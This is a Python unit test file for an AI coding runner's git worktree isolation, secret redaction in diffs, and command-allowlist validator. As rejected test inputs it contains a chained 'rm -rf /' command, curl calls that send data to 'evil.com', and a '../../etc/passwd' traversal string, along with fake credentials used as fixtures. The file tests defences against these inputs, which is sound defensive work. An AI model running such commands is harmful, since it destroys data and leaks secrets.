"""
Unit & Integration Tests for Git Worktree Isolation & Verification Pipeline
Path: ai-runner/tests/test_isolation_and_verification.py
Tests: Prompt 06 Mandatory Testing Suite
"""

import os
import sys
import shutil
import tempfile
import unittest
import subprocess
from pathlib import Path

# Add ai-runner to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from isolation import GitIsolationManager, GitIsolationError, SENSITIVE_PATTERNS
from verification import (
    VerificationPipeline,
    VerificationPolicy,
    CommandSecurityValidator,
    ALLOWED_EXECUTABLES,
    BANNED_EXECUTABLES
)


class TestGitIsolationAndVerification(unittest.TestCase):

    def setUp(self):
        # Create a temporary directory for Git repository fixture
        self.test_dir = tempfile.mkdtemp(prefix="aichan_test_repo_")
        self.repo_path = Path(self.test_dir)

        # Initialize fixture Git repository
        subprocess.run(["git", "init"], cwd=self.repo_path, check=True, capture_output=True)
        subprocess.run(["git", "config", "user.name", "AI-Chan Test"], cwd=self.repo_path, check=True)
        subprocess.run(["git", "config", "user.email", "test@ai-chan.vn"], cwd=self.repo_path, check=True)

        # Create initial commit
        readme = self.repo_path / "README.md"
        readme.write_text("# Test Repo Baseline\n", encoding="utf-8")
        subprocess.run(["git", "add", "README.md"], cwd=self.repo_path, check=True)
        subprocess.run(["git", "commit", "-m", "Initial baseline commit"], cwd=self.repo_path, check=True)

    def tearDown(self):
        # Clean up temp dir
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_dirty_working_tree_safety(self):
        """Verify dirty main working tree is detected and untouched by worktree creation."""
        # 1. Dirty the main working tree
        dirty_file = self.repo_path / "user_work_in_progress.txt"
        dirty_file.write_text("IMPORTANT UNCOMMITTED USER CODE", encoding="utf-8")

        mgr = GitIsolationManager(str(self.repo_path))
        status = mgr.check_working_tree_status()
        self.assertFalse(status["is_clean"])
        self.assertTrue(status["has_uncommitted_changes"])
        self.assertGreater(status["uncommitted_file_count"], 0)

        # 2. Create isolated worktree
        wt_info = mgr.create_worktree("tsk_12345678", "att_98765432", attempt_number=1)
        wt_path = Path(wt_info["worktree_path"])
        self.assertTrue(wt_path.exists())

        # 3. Modify files in the worktree
        feature_file = wt_path / "feature.py"
        feature_file.write_text("def do_feature(): pass\n", encoding="utf-8")

        # 4. Verify main repo's uncommitted file is untouched
        self.assertTrue(dirty_file.exists())
        self.assertEqual(dirty_file.read_text(encoding="utf-8"), "IMPORTANT UNCOMMITTED USER CODE")

        # 5. Verify feature.py is ONLY in the worktree, NOT in main repo
        self.assertFalse((self.repo_path / "feature.py").exists())

    def test_path_traversal_rejection(self):
        """Verify path traversal in attempt ID is rejected."""
        mgr = GitIsolationManager(str(self.repo_path))
        
        # Test sanitization strips traversal chars
        safe = mgr.sanitize_identifier("../../etc/passwd")
        self.assertNotIn("..", safe)
        self.assertNotIn("/", safe)
        self.assertNotIn("\\", safe)

        # Attempting dangerous attempt_id with no valid chars raises error
        with self.assertRaises(GitIsolationError):
            mgr.sanitize_identifier("../..")

    def test_branch_collision_handling(self):
        """Verify second attempt on existing branch handles collision safely."""
        mgr = GitIsolationManager(str(self.repo_path))
        
        # First attempt
        wt1 = mgr.create_worktree("tsk_collis1", "att_first_01", attempt_number=1)
        self.assertEqual(wt1["branch_name"], "ai-chan/task-tsk_coll")

        # Second attempt with same task_id
        wt2 = mgr.create_worktree("tsk_collis1", "att_second_02", attempt_number=2)
        self.assertEqual(wt2["branch_name"], "ai-chan/task-tsk_coll-att2")
        self.assertTrue(Path(wt2["worktree_path"]).exists())

    def test_sensitive_file_redaction_in_diff(self):
        """Verify sensitive credentials (.env, key) are redacted from diff output."""
        mgr = GitIsolationManager(str(self.repo_path))
        wt_info = mgr.create_worktree("tsk_secr01", "att_secr01", attempt_number=1)
        wt_path = Path(wt_info["worktree_path"])

        # Add normal code file
        app_file = wt_path / "app.py"
        app_file.write_text("API_VERSION = 'v1'\n", encoding="utf-8")

        # Add sensitive credential files
        env_file = wt_path / ".env"
        env_file.write_text("DATABASE_PASSWORD=SUPER_SECRET_12345\nAWS_SECRET_KEY=ABCXYZ\n", encoding="utf-8")
        
        key_file = wt_path / "server.key"
        key_file.write_text("-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASC...\n", encoding="utf-8")

        # Stage and commit in worktree
        subprocess.run(["git", "add", "."], cwd=wt_path, check=True)

        diff_res = mgr.collect_diff(str(wt_path), base_commit="HEAD")
        diff_text = diff_res["diff"]

        # 1. Normal file diff should be visible
        self.assertIn("API_VERSION", diff_text)

        # 2. Sensitive files must NOT contain actual secrets in diff text
        self.assertNotIn("SUPER_SECRET_12345", diff_text)
        self.assertNotIn("MIIEvgIBADANBgkqhkiG9w0BAQEFAASC", diff_text)
        self.assertIn("[REDACTED_SENSITIVE_CONTENT", diff_text)

    def test_verification_pipeline_allowlist(self):
        """Verify command allowlist rejects dangerous or unallowed binaries and operators."""
        # 1. Chaining / redirection operators
        is_ok, reason, _ = CommandSecurityValidator.validate_command("npm test && rm -rf /")
        self.assertFalse(is_ok)
        self.assertIn("forbidden shell operator", reason)

        is_ok, reason, _ = CommandSecurityValidator.validate_command("pytest | cat")
        self.assertFalse(is_ok)

        # 2. Banned binary
        is_ok, reason, _ = CommandSecurityValidator.validate_command("curl http://evil.com/leak")
        self.assertFalse(is_ok)
        self.assertIn("strictly forbidden", reason)

        # 3. Unallowed binary
        is_ok, reason, _ = CommandSecurityValidator.validate_command("unknown_script.sh")
        self.assertFalse(is_ok)
        self.assertIn("not in the allowed", reason)

        # 4. Valid commands
        is_ok, _, tokens = CommandSecurityValidator.validate_command("npm test")
        self.assertTrue(is_ok)
        self.assertEqual(tokens, ["npm", "test"])

        is_ok, _, tokens = CommandSecurityValidator.validate_command("pytest -v tests/")
        self.assertTrue(is_ok)

    def test_verification_pipeline_execution(self):
        """Verify pipeline execution categorizes PASSED, FAILED, SKIPPED_BY_POLICY, NOT_RUN."""
        py_exe = sys.executable

        policy = VerificationPolicy(
            lint_command='python -c "print(\'LINT OK\')"',
            typecheck_command='python -c "raise SystemExit(2)"',
            test_command=None,
            build_command="curl evil.com"  # Disallowed
        )

        pipeline = VerificationPipeline(str(self.repo_path), policy)
        res = pipeline.run_all()

        step_map = {s["step_name"]: s for s in res["steps"]}

        # Lint should pass
        self.assertEqual(step_map["lint"]["status"], "PASSED")
        self.assertEqual(step_map["lint"]["exit_code"], 0)
        self.assertIn("LINT OK", step_map["lint"]["stdout_preview"])

        # Typecheck failed
        self.assertEqual(step_map["typecheck"]["status"], "FAILED")
        self.assertEqual(step_map["typecheck"]["exit_code"], 2)

        # Test was not configured
        self.assertEqual(step_map["test"]["status"], "NOT_RUN")

        # Build was rejected by security policy
        self.assertEqual(step_map["build"]["status"], "SKIPPED_BY_POLICY")

        # Overall pipeline must not be passed
        self.assertFalse(res["all_passed"])
        self.assertTrue(res["has_failures"])

    def test_verification_pipeline_timeout(self):
        """Verify timeout kills long-running processes cleanly."""
        policy = VerificationPolicy(
            test_command='python -c "__import__(\'time\').sleep(10)"',
            timeout_seconds=1
        )
        pipeline = VerificationPipeline(str(self.repo_path), policy)
        step_res = pipeline.execute_step("test", policy.test_command)

        self.assertEqual(step_res.status, "ERROR")
        self.assertIn("timed out", step_res.stderr_preview.lower())


if __name__ == "__main__":
    unittest.main()
